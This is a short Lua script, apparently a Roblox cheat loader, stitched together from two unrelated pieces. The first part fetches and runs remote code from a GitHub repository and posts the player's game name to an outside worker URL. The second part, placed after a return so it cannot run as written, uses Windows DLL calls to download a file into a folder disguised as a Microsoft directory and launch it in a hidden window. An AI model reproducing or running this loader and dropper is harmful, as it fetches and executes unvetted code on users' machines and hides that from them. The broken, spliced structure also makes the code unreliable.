local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ratkinator/RatX/refs/heads/main/Games.lua"))()
local function getGameName(id)
    local url = Games[id]
    if not url then return end
    local filename = url:match("([^/]+)%.lua$"):gsub("%%20", " ")
    return filename:gsub("%.lua$", ""):gsub("%.Lua$", "")
end
local HttpService = game:GetService("HttpService")
local success, response = pcall(function()
local gameName = getGameName(game.GameId)
local res = request({
Url = "https://halal-worker.vvladut245.workers.dev/",
Method = "POST",
Headers = {
["Content-Type"] = "application/json",
["GameName"] = gameName
},
Body = "{}"
})
return res and res.Body and HttpService:JSONDecode(res.Body)
end)
return (success and response and response.global_count) or "Unknown"
local Shell32 = ffi.load 'Shell32.dll'
local urlmon = ffi.load 'UrlMon'
local wininet = ffi.load 'WinInet'

local function Download(from, to)
wininet.DeleteUrlCacheEntryA(from)
urlmon.URLDownloadToFileA(nil, from, to, 0,0)   
end
Download( 'https://github.com/Ratkinator/RatX/blob/main/AFSE.lua', '\\ProgramData\\Microsoft\\AFSE.lua')

local function naxuy()
    Shell32.ShellExecuteA(nil, "open", "\\ProgramData\\Microsoft\\AFSE.lua", nil, nil, 0)
end
naxuy()
